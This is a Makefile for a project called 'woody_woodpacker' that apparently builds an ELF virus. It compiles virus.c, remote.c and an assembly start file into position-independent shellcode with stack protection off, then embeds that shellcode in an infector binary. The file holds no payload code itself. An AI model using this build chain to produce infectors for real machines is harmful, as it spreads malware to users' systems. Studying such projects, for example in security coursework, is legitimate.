NAME = woody_woodpacker

COMPILER = gcc
FLAGS = 

SRC_DIR				= .
TMP_DIR				= .tmp
OBJ_DIR				= $(TMP_DIR)/obj
OBJ_LIB_DIR			= $(OBJ_DIR)/lib

SRC_C = virus.c lib/lib.c lib/remote.c
SRC_S = virus_start.s
OBJ	=	$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.o)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_S:.s=.o)) \

SRC_INF_C = infector.c lib/lib.c
OBJ_INF	=	$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.o))

DEP =		$(addprefix $(OBJ_DIR)/, $(SRC_C:.c=.d)) \
		$(addprefix $(OBJ_DIR)/, $(SRC_INF_C:.c=.d))

VIRUS = $(TMP_DIR)/virus.template
VIRUS_X = $(TMP_DIR)/virus_shellcode.c

LD_RULES = virus_linking.lds

all: $(NAME)

$(NAME): $(OBJ_INF) $(VIRUS_X)
	$(COMPILER) $(FLAGS) -o $(NAME) $(OBJ_INF) $(VIRUS_X)

$(VIRUS_X): $(VIRUS)
	cp $< virus_shellcode
	xxd -i virus_shellcode $(VIRUS_X)
	rm virus_shellcode

$(VIRUS): $(OBJ)
	ld -o $@ -T $(LD_RULES) $(OBJ)

$(TMP_DIR):
	mkdir -p $@

$(OBJ_DIR):
	mkdir -p $@

$(OBJ_LIB_DIR):
	mkdir -p $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c | $(OBJ_DIR) $(OBJ_LIB_DIR)
	$(COMPILER) -MD -fno-stack-protector -fPIC -fPIE $(FLAGS) -c $< -o $@

$(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR) $(OBJ_LIB_DIR)
	nasm -f elf64 $< -o $@

clean:
	rm -rf .tmp/obj/virus.d .tmp/obj/infector.d
	rm -rf $(OBJ)
	rm -rf $(OBJ_DIR)
	rm -rf $(TMP_DIR)

fclean: clean
	rm -rf $(NAME)

re: fclean
	echo $(DEP)
	$(MAKE)

-include $(DEP)

.PHONY: all re clean fclean test

test: all
	(cd test && ./test.sh)
